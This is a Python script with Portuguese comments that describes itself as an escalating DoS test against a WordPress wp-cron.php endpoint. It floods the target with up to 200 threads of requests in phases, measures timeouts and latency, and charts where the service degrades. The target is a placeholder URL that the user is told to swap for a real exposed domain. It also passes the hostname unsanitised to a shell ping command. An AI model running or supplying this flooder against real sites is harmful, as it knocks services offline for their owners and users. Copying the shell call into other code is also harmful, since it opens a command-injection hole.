import requests
import threading
import time
import matplotlib.pyplot as plt
import numpy as np
from datetime import datetime
import socket
import platform
import os
from matplotlib.gridspec import GridSpec
import json

# Parâmetros de configuração
URL = "http://exemplo.com/wp-cron.php" #Substituir por domínio com o endpoint confirmadamente exposto
FASES = [0, 20, 50, 100, 150, 200]  # Primeira fase (0) é medição de baseline
DURACAO_FASE = 20  # segundos por fase
TIMEOUT = 21  # timeout de requisição em segundos
PASTA_SAIDA = "resultados_teste_flooding"


# Variáveis globais
latencias = []
timestamps = []
codigos_status = []
marcadores_fase = []
fase_atual = 0
parar_fase = False
lock = threading.Lock()

def obter_metricas_baseline():
    """Mede condições de rede baseline antes do teste"""
    print("[*] Medindo condições de rede baseline...")
    
    # Teste de ping simples
    host = URL.split("//")[1].split("/")[0]
    resultado_ping = os.popen(f"ping -c 4 {host}").read()
    
    # Informações básicas de conectividade
    baseline = {
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "hostname": socket.gethostname(),
        "plataforma": platform.platform(),
        "alvo": URL,
        "resultado_ping": resultado_ping.strip(),
        "fases": FASES,
        "duracao_fase": DURACAO_FASE
    }
    
    # Salvar informações de baseline
    os.makedirs(PASTA_SAIDA, exist_ok=True)
    with open(f"{PASTA_SAIDA}/baseline.json", "w") as f:
        json.dump(baseline, f, indent=2)
    
    return baseline

def fazer_requisicao():
    """Faz uma única requisição e registra métricas"""
    global latencias, timestamps, codigos_status
    
    tempo_inicio = time.time()
    try:
        r = requests.get(URL, timeout=TIMEOUT)
        latencia = r.elapsed.total_seconds()
        status = r.status_code
    except requests.exceptions.Timeout:
        latencia = TIMEOUT
        status = "Timeout"
    except Exception as e:
        latencia = time.time() - tempo_inicio
        status = f"Erro: {str(e)[:20]}"
    
    with lock:
        latencias.append(latencia)
        timestamps.append(time.time())
        codigos_status.append(status)

def worker_flood():
    """Thread worker que faz requisições continuamente"""
    global parar_fase
    while not parar_fase:
        fazer_requisicao()

def executar_fase_teste(qtd_threads):
    """Executa uma única fase do teste com a quantidade especificada de threads"""
    global parar_fase, fase_atual, marcadores_fase
    
    parar_fase = False
    threads = []
    tempo_inicio_fase = time.time()
    
    # Marca o início desta fase
    with lock:
        marcadores_fase.append((len(latencias), qtd_threads, tempo_inicio_fase))
    
    print(f"[+] Fase {fase_atual}: {qtd_threads} threads")
    
    # Cria e inicia as threads
    for _ in range(qtd_threads):
        t = threading.Thread(target=worker_flood)
        t.daemon = True
        t.start()
        threads.append(t)
    
    # Aguarda a duração da fase
    time.sleep(DURACAO_FASE)
    
    # Encerra as threads
    parar_fase = True
    time.sleep(1)  # Dá tempo para as threads terminarem
    
    print(f"[-] Fase {fase_atual} encerrada - {qtd_threads} threads")
    fase_atual += 1

def classificar_latencias():
    """Classifica as latências por faixa"""
    faixas = {
        "≤1s (normal)": 0,
        "1–3s (leve)": 0,
        "3–5s (moderada)": 0,
        "5–10s (crítica)": 0,
        ">10s (grave)": 0
    }

    for l in latencias:
        if l <= 1:
            faixas["≤1s (normal)"] += 1
        elif l <= 3:
            faixas["1–3s (leve)"] += 1
        elif l <= 5:
            faixas["3–5s (moderada)"] += 1
        elif l <= 10:
            faixas["5–10s (crítica)"] += 1
        else:
            faixas[">10s (grave)"] += 1
            
    return faixas

def calcular_estatisticas_por_fase():
    """Calcula estatísticas para cada fase do teste"""
    estatisticas = []
    
    for i in range(len(marcadores_fase)):
        inicio_idx = marcadores_fase[i][0]
        fim_idx = marcadores_fase[i+1][0] if i < len(marcadores_fase)-1 else len(latencias)
        
        lat_fase = latencias[inicio_idx:fim_idx]
        stat_fase = codigos_status[inicio_idx:fim_idx]
        
        if not lat_fase:
            continue
            
        # Contagem de timeouts e erros
        timeouts = stat_fase.count("Timeout")
        erros = sum(1 for s in stat_fase if isinstance(s, str) and s.startswith("Erro"))
        sucessos = sum(1 for s in stat_fase if isinstance(s, int) and 200 <= s < 300)
        
        # Estatísticas de latência
        lat_array = np.array([l for l in lat_fase if l < TIMEOUT])  # Ignorar timeouts para estatísticas
        
        if len(lat_array) > 0:
            media = np.mean(lat_array)
            mediana = np.median(lat_array)
            percentil_95 = np.percentile(lat_array, 95) if len(lat_array) >= 20 else None
        else:
            media = mediana = percentil_95 = None
        
        estatisticas.append({
            "fase": i,
            "threads": marcadores_fase[i][1],
            "requisicoes": len(lat_fase),
            "timeouts": timeouts,
            "timeouts_pct": (timeouts / len(lat_fase)) * 100 if lat_fase else 0,
            "erros": erros,
            "sucessos": sucessos,
            "media_latencia": media,
            "mediana_latencia": mediana,
            "percentil_95": percentil_95
        })
    
    return estatisticas

def gerar_relatorio():
    """Gera relatório e gráficos do teste"""
    os.makedirs(PASTA_SAIDA, exist_ok=True)
    timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
    
    # Salvar dados brutos
    dados_teste = {
        "latencias": latencias,
        "timestamps": [t - timestamps[0] for t in timestamps],  # Tempo relativo ao início
        "codigos_status": [str(s) for s in codigos_status],
        "fases": [(m[0], m[1], m[2] - timestamps[0]) for m in marcadores_fase]
    }
    
    with open(f"{PASTA_SAIDA}/dados_brutos_{timestamp}.json", "w") as f:
        json.dump(dados_teste, f)
    
    # Estatísticas por fase
    estatisticas = calcular_estatisticas_por_fase()
    with open(f"{PASTA_SAIDA}/estatisticas_{timestamp}.json", "w") as f:
        json.dump(estatisticas, f, indent=2)
    
    # Classificação de latências
    faixas = classificar_latencias()
    
    # Criar figura com múltiplos gráficos
    plt.figure(figsize=(15, 15))
    gs = GridSpec(3, 2)
    
    # 1. Gráfico de Pizza das Latências
    ax1 = plt.subplot(gs[0, 0])
    labels = list(faixas.keys())
    sizes = list(faixas.values())
    colors = ['#8BC34A', '#FFEB3B', '#FFC107', '#FF5722', '#B71C1C']
    
    ax1.pie(sizes, labels=labels, colors=colors, autopct='%1.1f%%', startangle=140)
    ax1.set_title("Distribuição de Latência das Requisições")
    
    # 2. Gráfico de Linha Temporal
    ax2 = plt.subplot(gs[0, 1])
    tempos_rel = [t - timestamps[0] for t in timestamps]
    ax2.plot(tempos_rel, latencias, 'b-', alpha=0.5)
    ax2.set_ylim(0, min(max(latencias) * 1.1, TIMEOUT * 1.1))
    
    # Adicionar marcadores de fase
    for m in marcadores_fase:
        ax2.axvline(x=m[2] - timestamps[0], color='r', linestyle='--', alpha=0.7)
        ax2.text(m[2] - timestamps[0], max(latencias) * 0.9, f"{m[1]} threads", rotation=90)
    
    ax2.set_title("Latência ao Longo do Tempo")
    ax2.set_xlabel("Tempo (segundos)")
    ax2.set_ylabel("Latência (segundos)")
    
    # 3. Gráfico de Barras - Latência Média por Fase
    ax3 = plt.subplot(gs[1, 0])
    fases_num = [e["fase"] for e in estatisticas]
    medias = [e["media_latencia"] if e["media_latencia"] is not None else 0 for e in estatisticas]
    threads = [e["threads"] for e in estatisticas]
    
    ax3.bar(fases_num, medias, color='orange')
    ax3.set_title("Latência Média por Fase")
    ax3.set_xlabel("Fase")
    ax3.set_ylabel("Latência Média (segundos)")
    
    # Adicionar labels de threads
    for i, v in enumerate(medias):
        if v > 0:
            ax3.text(i, v + 0.1, f"{threads[i]} thr", ha='center')
    
    # 4. Gráfico de Barras - Timeouts por Fase
    ax4 = plt.subplot(gs[1, 1])
    timeouts_pct = [e["timeouts_pct"] for e in estatisticas]
    
    ax4.bar(fases_num, timeouts_pct, color='red')
    ax4.set_title("Porcentagem de Timeouts por Fase")
    ax4.set_xlabel("Fase")
    ax4.set_ylabel("Timeouts (%)")
    ax4.set_ylim(0, 100)
    
    # 5. Gráfico de linha - Taxa de Sucesso por Fase
    ax5 = plt.subplot(gs[2, 0])
    sucesso_pct = [e["sucessos"] / e["requisicoes"] * 100 if e["requisicoes"] > 0 else 0 for e in estatisticas]
    
    ax5.plot(fases_num, sucesso_pct, 'go-', linewidth=2)
    ax5.set_title("Taxa de Sucesso por Fase")
    ax5.set_xlabel("Fase")
    ax5.set_ylabel("Requisições com Sucesso (%)")
    ax5.set_ylim(0, 100)
    
    # 6. Diagrama de Degradação de Serviço
    ax6 = plt.subplot(gs[2, 1])
    requisicoes = [e["requisicoes"] for e in estatisticas]
    
    ax6.plot(threads, requisicoes, 'bo-', linewidth=2)
    ax6.set_title("Capacidade de Processamento por Carga")
    ax6.set_xlabel("Número de Threads")
    ax6.set_ylabel("Requisições Processadas")
    
    plt.tight_layout()
    plt.savefig(f"{PASTA_SAIDA}/relatorio_completo_{timestamp}.png", dpi=300)
    
    # Salvar visualizações individuais
    plt.figure(figsize=(8, 8))
    plt.pie(sizes, labels=labels, colors=colors, autopct='%1.1f%%', startangle=140)
    plt.title("Distribuição de Latência das Requisições")
    plt.axis('equal')
    plt.tight_layout()
    plt.savefig(f"{PASTA_SAIDA}/grafico_pizza_{timestamp}.png")
    
    # Informações de resumo para o terminal
    print("\n=== RESUMO DO TESTE ===")
    print(f"URL testada: {URL}")
    print(f"Total de requisições: {len(latencias)}")
    print(f"Duração total: {tempos_rel[-1]:.1f} segundos")
    print("\nLatências por faixa:")
    for faixa, qtd in faixas.items():
        print(f"  {faixa}: {qtd} ({qtd/len(latencias)*100:.1f}%)")
    
    print("\nResultados por fase:")
    for e in estatisticas:
        print(f"  Fase {e['fase']} ({e['threads']} threads): {e['requisicoes']} req, " +
              f"{e['timeouts_pct']:.1f}% timeouts, " +
              f"latência média: {e['media_latencia']:.3f}s")
    
    # Identificar o ponto de degradação
    for i in range(1, len(estatisticas)):
        if estatisticas[i]["timeouts_pct"] > 50 or (estatisticas[i]["media_latencia"] is not None and 
           estatisticas[i-1]["media_latencia"] is not None and 
           estatisticas[i]["media_latencia"] > estatisticas[i-1]["media_latencia"] * 3):
            print(f"\n[!] Ponto de degradação identificado: Fase {estatisticas[i]['fase']} com {estatisticas[i]['threads']} threads")
            break
    
    print(f"\nRelatório completo salvo em: {PASTA_SAIDA}/")
    
    return estatisticas

# Função principal
def main():
    global fase_atual
    
    print("[*] Iniciando teste de DoS escalonado")
    print(f"[*] URL de destino: {URL}")
    print(f"[*] Fases: {FASES} threads")
    print(f"[*] Duração por fase: {DURACAO_FASE} segundos\n")
    
    # Criar pasta de saída
    os.makedirs(PASTA_SAIDA, exist_ok=True)
    
    # Obter métricas de baseline
    baseline = obter_metricas_baseline()
    
    # Executar fases do teste
    for qtd_threads in FASES:
        executar_fase_teste(qtd_threads)
    
    # Gerar relatório e visualizações
    estatisticas = gerar_relatorio()
    
    print("\n[*] Teste concluído!")

if __name__ == "__main__":
    main()
